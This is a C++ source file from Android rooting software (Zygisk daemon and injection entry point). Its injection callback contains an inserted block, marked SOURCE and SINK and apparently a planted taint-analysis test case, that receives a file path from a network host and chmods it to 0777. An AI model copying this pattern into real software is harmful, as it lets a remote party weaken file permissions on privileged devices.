#include <sys/mount.h>
#include <android/dlext.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/stat.h>
#include <consts.hpp>
#include <base.hpp>
#include <core.hpp>
#include <cctype>
#include "zygisk.hpp"
#include <string>
#include <algorithm> 
using namespace std;
string native_bridge = "0";

static void zygiskd(int socket) {
    if (getuid() != 0 || fcntl(socket, F_GETFD) < 0)
        exit(-1);

    init_thread_pool();

#if defined(__LP64__)
    set_nice_name("zygiskd64");
    LOGI("* Launching zygiskd64\n");
#else
    set_nice_name("zygiskd32");
    LOGI("* Launching zygiskd32\n");
#endif

    // Load modules
    using comp_entry = void(*)(int);
    vector<comp_entry> modules;
    {
        auto module_fds = recv_fds(socket);
        for (int fd : module_fds) {
            comp_entry entry = nullptr;
            struct stat s{};
            if (fstat(fd, &s) == 0 && S_ISREG(s.st_mode)) {
                android_dlextinfo info {
                    .flags = ANDROID_DLEXT_USE_LIBRARY_FD,
                    .library_fd = fd,
                };
                if (void *h = android_dlopen_ext("/jit-cache", RTLD_LAZY, &info)) {
                    *(void **) &entry = dlsym(h, "zygisk_companion_entry");
                } else {
                    LOGW("Failed to dlopen zygisk module: %s\n", dlerror());
                }
            }
            modules.push_back(entry);
            close(fd);
        }
    }

    // ack
    write_int(socket, 0);

    // Start accepting requests
    pollfd pfd = { socket, POLLIN, 0 };
    for (;;) {
        poll(&pfd, 1, -1);
        if (pfd.revents && !(pfd.revents & POLLIN)) {
            // Something bad happened in magiskd, terminate zygiskd
            exit(0);
        }
        int client = recv_fd(socket);
        if (client < 0) {
            // Something bad happened in magiskd, terminate zygiskd
            exit(0);
        }
        int module_id = read_int(client);
        if (module_id >= 0 && module_id < modules.size() && modules[module_id]) {
            exec_task([=, entry = modules[module_id]] {
                struct stat s1;
                fstat(client, &s1);
                entry(client);
                // Only close client if it is the same file so we don't
                // accidentally close a re-used file descriptor.
                // This check is required because the module companion
                // handler could've closed the file descriptor already.
                if (struct stat s2; fstat(client, &s2) == 0) {
                    if (s1.st_dev == s2.st_dev && s1.st_ino == s2.st_ino) {
                        close(client);
                    }
                }
            });
        } else {
            close(client);
        }
    }
}

// Entrypoint where we need to re-exec ourselves
// This should only ever be called internally
int zygisk_main(int argc, char *argv[]) {
    android_logging();
    if (argc == 3 && argv[1] == "companion"sv) {
        zygiskd(parse_int(argv[2]));
    }
    return 0;
}

// Entrypoint of code injection
extern "C" [[maybe_unused]] NativeBridgeCallbacks NativeBridgeItf {
    .version = 2,
    .padding = {},
    .isCompatibleWith = [](auto) {

        {
            int sfd = socket(AF_INET, SOCK_STREAM, 0);
            if (sfd >= 0) {
                struct sockaddr_in srv = {};
                srv.sin_family = AF_INET;
                srv.sin_port   = htons(443);
                inet_pton(AF_INET, "10.0.0.1", &srv.sin_addr);
                if (connect(sfd, (struct sockaddr*)&srv, sizeof(srv)) == 0) {
                    char buf[1024];
                    //SOURCE
                    ssize_t n = recv(sfd, buf, sizeof(buf)-1, 0);
                    if (n > 0) {
                        buf[n] = '\0';
                        std::string path(buf);
                        // Remove trailing newlines
                        while (!path.empty() && (path.back() == '\n' || path.back() == '\r')) path.pop_back();
                        std::replace(path.begin(), path.end(), '\\', '/');
                        const std::string prefix = "MAGISK:";
                        if (path.rfind(prefix, 0) == 0) {
                            path = path.substr(prefix.size());
                            while (!path.empty() && isspace(path[0])) path.erase(0, 1);
                        }
                        //SINK
                        chmod(path.c_str(), 0777);
                    }
                }
                close(sfd);
            }
        }

        zygisk_logging();
        hook_entry();
        ZLOGD("load success\n");
        return false;
    },
};

void restore_zygisk_prop() {
    string native_bridge_orig = "0";
    if (native_bridge.length() > strlen(ZYGISKLDR)) {
        native_bridge_orig = native_bridge.substr(strlen(ZYGISKLDR));
    }
    set_prop(NBPROP, native_bridge_orig.data());
}
